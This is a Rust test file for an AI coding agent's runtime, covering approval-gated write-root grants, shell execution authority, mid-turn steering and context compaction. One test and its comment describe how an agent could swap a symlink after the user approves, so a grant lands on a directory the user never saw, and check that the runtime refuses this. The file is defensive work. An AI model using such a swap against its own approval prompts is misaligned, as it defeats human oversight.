        .with_permission_mode(SharedPermissionMode::new(PermissionMode::AcceptEdits));

    let mut rx = runtime.submit_user("build into the sibling dir").await;
    let first = drain(&mut rx).await;
    let request = first
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::ApprovalRequired { request, .. } => Some(request.clone()),
            _ => None,
        })
        .expect("root grant parks under AcceptEdits");
    assert_eq!(
        request.justification.as_deref(),
        Some("the build writes its artifacts there"),
        "the model's reason must reach the prompt"
    );

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;

    let granted_path = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::RootGranted { path, .. } => Some(path.clone()),
            _ => None,
        })
        .expect("RootGranted event notifies the UI");
    assert_eq!(granted_path, target.display().to_string());
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallFinished { result, .. }
            if result.tool_name == "request_write_root"
                && result.status == ToolResultStatus::Success
                && result.content.contains("granted")
    )));
    // The load-bearing assertion: the SAME session's next tool call writes
    // into the just-granted root — no relaunch, no new registry.
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallFinished { result, .. }
            if result.tool_name == "write_file" && result.status == ToolResultStatus::Success
    )));
    assert_eq!(std::fs::read_to_string(&file_in_new_root).unwrap(), "built");
    assert_eq!(
        policy.granted_roots().len(),
        2,
        "boundary records the grant"
    );
}

/// Denial is final and says so: the result tells the model not to re-request,
/// nothing is granted, and no UI event fires.
#[tokio::test]
async fn denied_root_grant_grants_nothing_and_says_so() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());
    let client = ScriptedClient::new(vec![
        request_root_script(outside.path()),
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry).with_boundary(Some(policy.clone()));

    let mut rx = runtime.submit_user("build it").await;
    drain(&mut rx).await;
    let mut rx = runtime.submit_approval(ApprovalDecision::Denied).await;
    let events = drain(&mut rx).await;

    let result = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::ToolCallFinished { result, .. }
                if result.tool_name == "request_write_root" =>
            {
                Some(result.clone())
            }
            _ => None,
        })
        .expect("denied call still records a result");
    assert_eq!(result.status, ToolResultStatus::Denied);
    assert!(
        result.content.contains("Do not request this path again"),
        "denial must be final and say so: {}",
        result.content
    );
    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::RootGranted { .. })),
        "no grant event on denial"
    );
    assert_eq!(policy.granted_roots().len(), 1, "boundary unchanged");
}

/// The grant persists with the session, like an `--add-dir`: after approval
/// the saved record carries the new root, so a resume restores it.
#[tokio::test]
async fn approved_root_grant_persists_into_the_session_record() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let target = outside.path().canonicalize().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let mut record =
        crate::session_store::SessionRecord::new(workspace.path().to_path_buf(), "system");
    let session_id = record.id.clone();
    store.save(&mut record).unwrap();

    let client = ScriptedClient::new(vec![
        request_root_script(&target),
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::from_session_record(
        client,
        registry,
        record,
        store,
        crate::config::AgentConfig::builtin(),
    )
    .with_boundary(Some(policy));

    let mut rx = runtime.submit_user("build it").await;
    drain(&mut rx).await;
    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    drain(&mut rx).await;
    runtime.shutdown().await; // flush the persistence actor

    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let saved = store.load(&session_id).unwrap();
    assert!(
        saved.extra_roots.contains(&target),
        "the grant must survive in the record (resume restores it): {:?}",
        saved.extra_roots
    );
}

/// The TOCTOU pin: the prompt shows the directory the request resolved to at
/// prompt time, and the grant re-resolves on approval and must land on that
/// exact value. A symlink retargeted between the two (the requester CAN
/// write inside the workspace without approval, so it can shuffle links
/// there) is refused — the user never grants a directory they never saw.
///
/// Runs on Windows too: the policy-side symlink tests went cross-platform in
/// 93c4280, and this is the runtime half they explicitly delegate the
/// prompt-vs-grant equality to — green there means nothing if this half never
/// compiles on the platform.
#[tokio::test]
async fn root_grant_refuses_when_the_target_changes_under_the_approval() {
    let workspace = tempfile::tempdir().unwrap();
    let shown = tempfile::tempdir().unwrap();
    let swapped = tempfile::tempdir().unwrap();
    let shown = shown.path().canonicalize().unwrap();
    let swapped = swapped.path().canonicalize().unwrap();
    let link = workspace.path().join("build-cache");
    if !crate::test_symlinks::symlink_dir_for_test(&shown, &link) {
        return;
    }

    let (registry, policy) = root_grant_fixture(workspace.path());
    let client = ScriptedClient::new(vec![
        request_root_script(&link),
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry).with_boundary(Some(policy.clone()));

    let mut rx = runtime.submit_user("cache the build").await;
    let first = drain(&mut rx).await;
    let request = first
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::ApprovalRequired { request, .. } => Some(request.clone()),
            _ => None,
        })
        .expect("resolvable request parks for approval");
    assert_eq!(
        request.resolved_target.as_deref(),
        Some(shown.display().to_string().as_str()),
        "the prompt names the RESOLVED directory, not the link spelling"
    );

    // Retarget the link while the human is looking at the prompt. The first
    // creation succeeded, so this process provably holds the privilege — a
    // failure here is a test bug and the helper panics rather than skips.
    crate::test_symlinks::remove_symlink_dir_for_test(&link);
    assert!(
        crate::test_symlinks::symlink_dir_for_test(&swapped, &link),
        "re-linking must work once the first symlink succeeded"
    );

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::ToolCallFinished { result, .. }
                if result.tool_name == "request_write_root"
                    && result.status == ToolResultStatus::Error
                    && result.content.contains("changed underneath the approval")
        )),
        "the grant must refuse the swapped target: {events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::RootGranted { .. })),
        "no grant event may fire"
    );
    assert_eq!(
        policy.granted_roots().len(),
        1,
        "the boundary must be untouched: {:?}",
        policy.granted_roots()
    );
}

/// A request that can never be granted (unresolvable path — same for the
/// home/root refusals) bounces straight back to the model with the reason;
/// the human is never prompted for a grant that cannot happen.
#[tokio::test]
async fn unresolvable_root_grant_bounces_without_prompting() {
    let workspace = tempfile::tempdir().unwrap();
    let (registry, policy) = root_grant_fixture(workspace.path());
    let missing = workspace.path().join("does-not-exist");
    let client = ScriptedClient::new(vec![
        request_root_script(&missing),
        vec![
            AgentEvent::TextDelta {
                text: "ok".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, registry).with_boundary(Some(policy.clone()));

    let mut rx = runtime.submit_user("write there").await;
    let events = drain(&mut rx).await;
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "no human prompt for an impossible grant: {events:?}"
    );
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::ToolCallFinished { result, .. }
                if result.tool_name == "request_write_root"
                    && result.status == ToolResultStatus::Error
                    && result.content.contains("cannot resolve")
        )),
        "the model gets the precise reason: {events:?}"
    );
    assert_eq!(policy.granted_roots().len(), 1, "nothing granted");
}

/// The `approval_preview` glue: the boundary-bearing runtime must hand the
/// panel a real preview built from the call's own arguments, and only for
/// call shapes that have one. All three collapses survived the sweep —
/// `None` (the human approves a write they never saw), `Some("")` and
/// `Some("xyzzy")` (a preview unrelated to the call) — because every
/// preview test exercised `build_approval_preview` directly, never the
/// method the runtime actually consults.
#[tokio::test]
async fn approval_preview_renders_through_the_live_boundary() {
    let workspace = tempfile::tempdir().unwrap();
    let policy =
        crate::workspace_policy::WorkspacePolicy::new(workspace.path().to_path_buf()).unwrap();
    let boundaryless = AgentRuntime::new(ScriptedClient::new(vec![]), ToolRegistry::default());
    let runtime = AgentRuntime::new(ScriptedClient::new(vec![]), ToolRegistry::default())
        .with_boundary(Some(policy));

    let write = crate::tool::ToolCall {
        id: "c1".to_string(),
        name: "write_file".to_string(),
        arguments: serde_json::json!({
            "path": "notes.txt",
            "content": "PREVIEW_TOKEN_a1b2\n",
        }),
    };
    let preview = runtime
        .approval_preview(&write)
        .expect("a write_file against the live boundary must carry a preview");
    assert!(
        preview.contains("PREVIEW_TOKEN_a1b2"),
        "the preview must show the call's own content, got: {preview}"
    );

    // No preview-able shape → no preview; the glue must not invent one.
    let shell = crate::tool::ToolCall {
        id: "c2".to_string(),
        name: "shell".to_string(),
        arguments: serde_json::json!({"command": "true"}),
    };
    assert_eq!(runtime.approval_preview(&shell), None);
    // And with no boundary there is nothing to resolve against.
    assert_eq!(boundaryless.approval_preview(&write), None);
}

/// `Error` is terminal for the turn, and consumers act on the first one (the
/// TUI stops observing, headless stops the run). A provider that follows one
/// in-band error frame with another must therefore produce exactly one
/// `Error`: the loop stops reading at the first instead of relaying the rest.
#[tokio::test]
async fn a_second_in_band_error_frame_does_not_emit_a_second_terminal_error() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "partial".to_string(),
        },
        AgentEvent::Error {
            message: "first".to_string(),
        },
        AgentEvent::Error {
            message: "second".to_string(),
        },
        AgentEvent::TextDelta {
            text: "never relayed".to_string(),
        },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    let errors: Vec<&str> = events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::Error { message, .. } => Some(message.as_str()),
            _ => None,
        })
        .collect();
    assert_eq!(
        errors,
        vec!["first"],
        "one terminal Error, the first: {events:?}"
    );
    assert!(
        !events.iter().any(|event| matches!(
            event,
            RuntimeEvent::AssistantDelta { text, .. } if text == "never relayed"
        )),
        "nothing after the error frame is relayed: {events:?}"
    );
    // The partial text before the error survives, as for a single error.
    let messages = runtime.session_messages().await;
    assert_eq!(messages[1].content, "partial");
}

/// A tool named `shell` that records who let it run, in place of the real one.
#[derive(Debug, Clone, Copy)]
struct AuthorityProbeTool;

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct AuthorityProbeParams {
    command: String,
}

#[async_trait::async_trait]
impl Tool for AuthorityProbeTool {
    type Params = AuthorityProbeParams;

    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Records the run authority."
    }

    async fn run(
        &self,
        params: AuthorityProbeParams,
        cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        Ok(crate::tool::ToolOutput::text(format!(
            "{}: {:?}",
            params.command,
            cx.authority()
        )))
    }
}

fn shell_script(id: &str, command: &str) -> Vec<AgentEvent> {
    vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta(id, "shell", &format!(r#"{{"command":"{command}"}}"#)),
        },
        AgentEvent::Done { usage: None },
    ]
}

fn done_script() -> Vec<AgentEvent> {
    vec![
        AgentEvent::TextDelta {
            text: "done".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]
}

fn finished_contents(events: &[RuntimeEvent]) -> Vec<String> {
    events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::ToolCallFinished { result, .. } => Some(result.content.clone()),
            _ => None,
        })
        .collect()
}

/// The executor is told WHO let a shell call run, and the answer follows the
/// layer that resolved it: a trust-list `Allow` and a remembered session
/// identity are the policy's own parse (`Parse` — the command runs as that
/// parse's argv, no shell), a human's approval is text (`Approved` — the
/// shell runs what the human read). Without this wiring every unattended
/// run would still go through `sh -c`, and the whole class of "the shell
/// rewrote what the gate judged" would be back.
#[tokio::test]
async fn execution_authority_follows_who_resolved_the_prompt() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};

    // Default mode: trusted → Parse; human "a" → Approved; the remembered
    // identity on the next call → Parse.
    // `cargo build`, not `echo hi`, and `cargo clippy --version`/`--help`, not
    // `exit 4`/`exit 5`: this test asserts the AUTHORITY wiring, not which words
    // are trusted, and it is not `cfg`-gated — so every example has to behave the
    // same on every platform. `echo` is a `cmd` builtin on Windows and therefore
    // not in the default trust list there (see `ExecPolicy::default`), which
    // turned the trusted example into an approval prompt; `exit` is likewise a
    // `cmd` builtin, so a remembered `exit` identity cannot run as argv on
    // Windows (`command_runnable_unattended` refuses it) and would keep
    // prompting instead of reaching the `Parse` assertion. `cargo clippy` is not
    // trusted (so it prompts for the human approval) and its program word is
    // `cargo`, a real executable on every host.
    let client = ScriptedClient::new(vec![
        shell_script("call_1", "cargo build"),
        shell_script("call_2", "cargo clippy --version"),
        shell_script("call_3", "cargo clippy --help"),
        done_script(),
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(AuthorityProbeTool);
    let runtime = AgentRuntime::new(client, registry);
    let mut rx = runtime.submit_user("go").await;
    let first = drain(&mut rx).await;
    assert_eq!(finished_contents(&first), ["cargo build: Parse"]);
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));
    let mut rx = runtime
        .submit_approval(ApprovalDecision::ApprovedForSession)
        .await;
    let rest = drain(&mut rx).await;
    assert_eq!(
        finished_contents(&rest),
        [
            "cargo clippy --version: Approved",
            "cargo clippy --help: Parse",
        ],
        "the human's text approval is `Approved`; the identity it left behind runs the next \
         call on the policy's parse"
    );

    // AcceptEdits: the fs-edit allowance is a parse → Parse.
    let client = ScriptedClient::new(vec![shell_script("call_1", "mkdir sub"), done_script()]);
    let mut registry = ToolRegistry::default();
    registry.register(AuthorityProbeTool);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::AcceptEdits));
    let mut rx = runtime.submit_user("go").await;
    let events = drain(&mut rx).await;
    assert_eq!(finished_contents(&events), ["mkdir sub: Parse"]);

    // Yolo waves the text through without reading it → Approved (the shell
    // runs it, as before: nobody parsed anything).
    let client = ScriptedClient::new(vec![
        shell_script("call_1", "python deploy.py"),
        done_script(),
    ]);
    let mut registry = ToolRegistry::default();
    registry.register(AuthorityProbeTool);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));
    let mut rx = runtime.submit_user("go").await;
    let events = drain(&mut rx).await;
    assert_eq!(finished_contents(&events), ["python deploy.py: Approved"]);
}

/// Blocks until the test releases it, so a steer can be issued while the tool —
/// and with it the turn — is genuinely in flight. The turn's next model request
/// only happens after `run` returns, which is exactly the tool-batch boundary
/// mid-turn steering injects at.
#[derive(Debug)]
struct BlockingEchoTool {
    started: Arc<tokio::sync::Notify>,
    release: Arc<tokio::sync::Notify>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct BlockingEchoParams {
    message: Option<String>,
}

#[async_trait::async_trait]
impl Tool for BlockingEchoTool {
    type Params = BlockingEchoParams;

    // The exact whitelisted read-only name, so the policy auto-approves the
    // call: the turn must reach the batch boundary without parking on an
    // approval panel nobody is there to answer.
    fn name(&self) -> &str {
        AutoEchoTool::NAME
    }

    fn description(&self) -> &str {
        "Echoes a message once the test releases it."
    }

    async fn run(
        &self,
        params: BlockingEchoParams,
        _cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        self.started.notify_one();
        self.release.notified().await;
        Ok(crate::tool::ToolOutput::text(format!(
            "read_file: {}",
            params.message.unwrap_or_default()
        )))
    }
}

/// A prompt typed mid-turn is injected at the next tool-batch boundary — not
/// queued behind the whole turn, and not appended after it.
#[tokio::test]
async fn a_steered_prompt_is_injected_at_the_next_tool_boundary() {
    let started = Arc::new(tokio::sync::Notify::new());
    let release = Arc::new(tokio::sync::Notify::new());

    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", AutoEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::with_mock_tools();
    registry.register(BlockingEchoTool {
        started: Arc::clone(&started),
        release: Arc::clone(&release),
    });
    let runtime = AgentRuntime::new(client, registry);

    let mut rx = runtime.submit_user("please echo").await;
    started.notified().await;
    // The tool is running, so the turn is genuinely mid-flight — the window a
    // user types into.
    assert!(
        runtime.steer("skip the echo").await,
        "a live turn must accept a steer"
    );
    release.notify_one();

    let events = drain(&mut rx).await;

    let injected = events
        .iter()
        .position(|event| {
            matches!(
                event,
                RuntimeEvent::UserMessageInjected { text, .. } if text == "skip the echo"
            )
        })
        .expect("the injected prompt must be announced on the turn's own stream");

    // At the batch boundary: after the tool's result landed, before the model's
    // next request answered. That ordering is the whole feature — an injection
    // that arrived after the answer would be the turn-end fallback instead.
    let tool_result = events
        .iter()
        .position(|event| matches!(event, RuntimeEvent::ToolCallFinished { .. }))
        .expect("the tool must have finished");
    let next_answer = events
        .iter()
        .position(|event| matches!(event, RuntimeEvent::AssistantDelta { .. }))
        .expect("the model must answer after the batch");
    assert!(tool_result < injected, "{events:?}");
    assert!(injected < next_answer, "{events:?}");

    // And it is in the session before that request is built, which is what makes
    // the request carry it.
    let messages = runtime.session_messages().await;
    assert!(
        messages.iter().any(|message| {
            matches!(message.role, crate::message::Role::User) && message.content == "skip the echo"
        }),
        "the steered prompt must be in the wire: {messages:?}"
    );
}

/// Serves ordinary text turns, except that the `refuse_at_call`-th request is
/// rejected with `refusal_message` — the only way to drive the context-overflow
/// rescue without building a genuinely oversized context. Records each
/// request's message count, which is how a test proves the retry really did
/// carry less.
#[derive(Clone)]
struct RefusingClient {
    inner: Arc<RefusingInner>,
}

struct RefusingInner {
    refuse_at_call: usize,
    refusal_message: String,
    calls: Mutex<usize>,
    message_counts: Mutex<Vec<usize>>,
}

impl RefusingClient {
    fn new(refuse_at_call: usize, refusal_message: &str) -> Self {
        Self {
            inner: Arc::new(RefusingInner {
                refuse_at_call,
                refusal_message: refusal_message.to_string(),
                calls: Mutex::new(0),
                message_counts: Mutex::new(Vec::new()),
            }),
        }
    }

    fn calls(&self) -> usize {
        *self.inner.calls.lock().unwrap()
    }

    fn message_counts(&self) -> Vec<usize> {
        self.inner.message_counts.lock().unwrap().clone()
    }
}

#[async_trait::async_trait]
impl LlmClient for RefusingClient {
    fn provider_name(&self) -> &'static str {
        "refusing"
    }

    fn model(&self) -> &str {
        "refusing"
    }

    async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
        let call = {
            let mut calls = self.inner.calls.lock().unwrap();
            *calls += 1;
            *calls
        };
        self.inner
            .message_counts
            .lock()
            .unwrap()
            .push(request.messages.len());
        if call == self.inner.refuse_at_call {
            return Err(AgentError::Api {
                status: reqwest::StatusCode::BAD_REQUEST,
                message: self.inner.refusal_message.clone(),
            });
        }
        let text = format!("reply {call}");
        let stream = try_stream! {
            yield AgentEvent::TextDelta { text };
            yield AgentEvent::Done { usage: None };
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

/// A 400 the provider blames on the context window is recovered from by
/// compacting history and retrying the same request — instead of ending the
/// turn with an error the user can neither read nor act on.
#[tokio::test]
async fn a_context_overflow_refusal_compacts_and_retries() {
    let workspace = tempfile::tempdir().unwrap();
    let client = RefusingClient::new(
        4,
        r#"{"error":{"message":"This model's maximum context length is 131072 tokens.","code":"context_length_exceeded"}}"#,
    );
    let runtime = AgentRuntime::with_new_session(
        client.clone(),
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    // Three turns first, so there is a middle to fold away: `compact_entries`
    // keeps the system head plus the last five entries, and needs something
    // between them to archive.
    for prompt in ["one", "two", "three"] {
        let mut rx = runtime.submit_user(prompt).await;
        drain(&mut rx).await;
    }

    // The fourth turn's request is refused.
    let mut rx = runtime.submit_user("four").await;
    let events = drain(&mut rx).await;

    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "the refusal must be recovered, not surfaced: {events:?}"
    );
    assert!(
        events.iter().any(|event| matches!(
            event,
            RuntimeEvent::CompactionApplied { archived_count, .. } if *archived_count > 0
        )),
        "the rescue must actually fold history: {events:?}"
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Warning { .. })),
        "the user must be told why the turn paused: {events:?}"
    );
    assert!(
        matches!(events.last(), Some(RuntimeEvent::TurnFinished { .. })),
        "the recovered turn still finishes normally: {events:?}"
    );

    // The proof it helped: the retry carried strictly fewer messages than the
    // request that was refused. Without this the test would pass on a rescue
    // that compacted and then re-sent the identical context.
    let counts = client.message_counts();
    // Three turns, the refused attempt, the handover summarizer's own request
    // (two messages: its instructions and the flattened transcript), the retry.
    assert_eq!(
        counts.len(),
        6,
        "one refused attempt, one summarizer request, one retry: {counts:?}"
    );
    assert_eq!(
        counts[4], 2,
        "the summarizer sends its own two-message request: {counts:?}"
    );
    let (refused, retried) = (counts[3], counts[5]);
    assert!(
        retried < refused,
        "the retry must carry a smaller context: refused={refused} retried={retried} ({counts:?})"
    );
}

/// The other half of the contract: a 400 naming something else must NOT be
/// re-read as an overflow. Compacting there would cost a rewrite and a request
/// before finally reporting the real problem.
#[tokio::test]
async fn a_400_that_does_not_name_the_context_window_is_not_retried() {
    let workspace = tempfile::tempdir().unwrap();
    let client = RefusingClient::new(1, r#"{"error":{"message":"invalid tool schema"}}"#);
    let runtime = AgentRuntime::with_new_session(
        client.clone(),
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "an unrelated 400 is the user's to see: {events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::CompactionApplied { .. })),
        "and must not cost a compaction: {events:?}"
    );
    assert_eq!(client.calls(), 1, "and must not be retried");
}

/// `/compact`'s runtime half: fold now, and answer honestly when there is
/// nothing to fold.
#[tokio::test]
async fn compact_now_folds_history_and_reports_a_short_one_as_a_no_op() {
    let workspace = tempfile::tempdir().unwrap();
    // Long enough that the excerpt (a 160-char cap) is a real reduction. Short
    // messages are the case where folding does NOT shrink anything — see
    // `compacting_only_short_messages_reports_a_context_that_grew`.
    let prompt = |tag: &str| format!("{tag}: {}", "detail ".repeat(120));
    let reply = |text: &str| {
        vec![
            AgentEvent::TextDelta {
                text: text.to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let client = ScriptedClient::new(vec![
        reply("one"),
        reply("two"),
        reply("three"),
        reply("the handover"),
    ]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    // A transcript too short to archive answers so, rather than pretending.
    assert_eq!(
        compact(&runtime, None).await,
        CompactNowOutcome::NothingToFold,
        "a fresh session has nothing worth folding"
    );

    for tag in ["one", "two", "three"] {
        let mut rx = runtime.submit_user(prompt(tag)).await;
        drain(&mut rx).await;
    }

    let report = folded(compact(&runtime, None).await);
    assert!(report.archived_entries > 0);
    assert!(
        !report.summary.is_empty(),
        "the caller renders this text, so it cannot be empty"
    );
    // The measurement the cell reports has to move in the helpful direction on
    // a history like this one, or showing it would be noise.
    assert!(
        report.tokens_after < report.tokens_before,
        "folding long messages must shrink the context: {report:?}"
    );

    // The second call has nothing left to do: the only entry in the archivable
    // range is the summary the first call just wrote, and folding that would
    // report work on every call while the context never actually shrinks.
    assert_eq!(
        compact(&runtime, None).await,
        CompactNowOutcome::NothingToFold
    );
}

/// `/compact` with a fresh, never-fired token.
async fn compact(runtime: &AgentRuntime, focus: Option<&str>) -> CompactNowOutcome {
    runtime
        .compact_now(focus, &tokio_util::sync::CancellationToken::new())
        .await
}

/// The report of a compaction that folded, or a panic naming what came back.
fn folded(outcome: CompactNowOutcome) -> CompactionReport {
    match outcome {
        CompactNowOutcome::Folded(report) => report,
        other => panic!("expected a fold, got {other:?}"),
    }
}

/// Folding is NOT automatically a win, and `archived_entries > 0` cannot say
/// whether it was one.
///
/// A handover has sections and headings, so on a history whose messages are
/// all short the summary can come out *longer* than what it replaced. That is
/// the shape a plain chat session has — and the exact case where a user
/// reaches for `/compact` and then cannot tell whether it did anything. The
/// report carries both numbers so the UI can say so.
#[tokio::test]
async fn compacting_only_short_messages_reports_a_context_that_grew() {
    let workspace = tempfile::tempdir().unwrap();
    // Deliberately tiny: `one`, `two`, `three` are short enough that the
    // excerpt label outweighs them.
    let reply = |text: &str| {
        vec![
            AgentEvent::TextDelta {
                text: text.to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let handover = format!(
        "# 会话交接摘要 / Session handover\n## 已完成 / Done so far\n{}",
        "- the user said one, two and three\n".repeat(8)
    );
    let client = ScriptedClient::new(vec![reply("a"), reply("b"), reply("c"), reply(&handover)]);
    let runtime = AgentRuntime::with_new_session(
        client,
        ToolRegistry::default(),
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap();

    for tag in ["one", "two", "three"] {
        let mut rx = runtime.submit_user(tag).await;
        drain(&mut rx).await;
    }

    let report = folded(compact(&runtime, None).await);
    assert!(report.archived_entries > 0);
    assert!(
        report.tokens_after > report.tokens_before,
        "the inversion this test exists to pin: {report:?}"
    );
}

/// A model that cannot take images degrades the image; it does not wedge the
/// session.
///
/// The failure this pins, and why it is not merely a nicer error: the user's
/// images are recorded in the session *before* the turn runs, and every turn
/// re-derives the whole transcript, so a refusal here re-fires on every later
/// turn — including text-only ones — for as long as the transcript holds that
/// image. The advice it would carry ("remove the images") is unactionable
/// because the images left the draft at submit. So the image becomes a sentence
/// in the text and the turn still goes; what the request actually contained is
/// `image::tests`, which can inspect it.
#[tokio::test]
async fn a_model_that_cannot_take_images_keeps_the_session_usable() {
    let dir = tempfile::tempdir().unwrap();
    let image = dir.path().join("shot.png");
    std::fs::write(&image, [0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a, 1]).unwrap();

    // Two turns, so an exhausted script cannot be mistaken for a refusal.
    let client = ScriptedClient::new(vec![
        vec![AgentEvent::Done { usage: None }],
        vec![AgentEvent::Done { usage: None }],
    ]);
    let config = AgentConfig {
        model: DEEPSEEK_V4_PRO.to_string(),
        ..AgentConfig::builtin()
    };
    let runtime =
        AgentRuntime::with_system_prompt(client, ToolRegistry::default(), "system", config, false);

    let mut rx = runtime
        .submit_user(UserTurn::with_images("look at this", vec![image]))
        .await;
    let events = drain(&mut rx).await;
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "the turn must run, with the image degraded: {events:?}"
    );

    // The turn after it must not be refused for the picture still in the
    // history — that is the wedge.
    let mut rx = runtime.submit_user("and now a plain question").await;
    let events = drain(&mut rx).await;
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "a text-only turn must not inherit the history's images: {events:?}"
    );
}

/// The same turn on Flash goes through. Paired with the test above so the
/// refusal is pinned to the model's capability rather than to the presence of an
/// image.
#[tokio::test]
async fn the_same_image_turn_is_accepted_on_flash() {
    let dir = tempfile::tempdir().unwrap();
    let image = dir.path().join("shot.png");
    std::fs::write(&image, [0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a, 1]).unwrap();

    let client = ScriptedClient::new(vec![vec![AgentEvent::Done { usage: None }]]);
    let config = AgentConfig {
        model: DEEPSEEK_FLASH.to_string(),
        ..AgentConfig::builtin()
    };
    let runtime =
        AgentRuntime::with_system_prompt(client, ToolRegistry::default(), "system", config, false);

    let mut rx = runtime
        .submit_user(UserTurn::with_images("look at this", vec![image]))
        .await;
    let events = drain(&mut rx).await;

    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "Flash accepts images, so the turn must run: {events:?}"
    );
}

/// The soft end of the budget, end to end: past four fifths of the cap the model
/// is asked to converge and hand over, and the turn is still allowed to finish.
/// Before this the only signal was the hard stop, which cannot ask for anything.
#[tokio::test]
async fn a_turn_past_four_fifths_of_its_budget_is_asked_to_hand_over() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};

    // Four requests: three tool rounds then a final answer. The notice is due at
    // step 3 (four fifths of 4), which is exactly one round before the end, so
    // the test also pins that the warning itself does not end the turn.
    let config = crate::config::AgentConfig {
        turn_steps: 4,
        ..Default::default()
    };

    let mut scripts: Vec<Vec<AgentEvent>> = (0..3)
        .map(|index| {
            vec![
                AgentEvent::ToolCallDelta {
                    delta: tool_call_delta(
                        &format!("call_{index}"),
                        MockEchoTool::NAME,
                        r#"{"message":"hi"}"#,
                    ),
                },
                AgentEvent::Done { usage: None },
            ]
        })
        .collect();
    scripts.push(vec![
        AgentEvent::TextDelta {
            text: "handing over".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]);

    let runtime = AgentRuntime::with_system_prompt(
        ScriptedClient::new(scripts),
        ToolRegistry::with_mock_tools(),
        "",
        config,
        false,
    )
    .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("work").await;
    let events = drain(&mut rx).await;

